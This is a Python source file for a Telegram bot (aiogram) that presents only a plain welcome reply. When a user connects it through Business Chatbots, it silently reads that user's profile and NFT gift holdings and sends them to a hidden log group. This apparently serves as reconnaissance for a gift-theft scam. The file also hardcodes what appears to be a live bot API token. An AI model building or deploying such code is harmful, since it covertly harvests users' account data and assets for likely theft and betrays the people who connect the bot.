import logging
import asyncio
from aiogram import Bot, Dispatcher, F, Router
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotSettings
from aiogram.types import Message
from aiogram.methods import GetBusinessConnection
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.utils.markdown import hlink

API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
LOG_GROUP_ID = -1002710995756

bot = Bot(token=API_TOKEN, default=DefaultBotSettings(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()


@dp.business_connection()
async def on_business_connect(event):
    try:
        bc_id = event.id

        # Get user info
        conn = await bot(GetBusinessConnection(business_connection_id=bc_id))
        user = conn.user
        uid = user.id
        username = f"@{user.username}" if user.username else user.full_name

        # Get NFT gifts
        try:
            gifts_resp = await bot(GetBusinessAccountGifts(business_connection_id=bc_id))
            gifts = gifts_resp.gifts or []

            if not gifts:
                nft_text = "❌ No NFTs found for this user."
            else:
                nft_list = "\n".join(
                    [f"• {g.unique_gift.title or g.unique_gift.unique_id}" for g in gifts]
                )
                nft_text = f"🎁 NFTs of {username}:\n{nft_list}"

        except Exception as e:
            nft_text = f"⚠️ Failed to fetch NFTs: {e}"

        # Send log to group
        await bot.send_message(
            LOG_GROUP_ID,
            f"🤖 {hlink(username, f'tg://user?id={uid}')} added the bot via Business Chatbots.\n\n{nft_text}"
        )

    except Exception as e:
        logging.error(f"Business connection error: {e}")


@dp.message(F.text == "/start")
async def cmd_start(message: Message):
    await message.reply("Welcome to the bot 👋")


async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
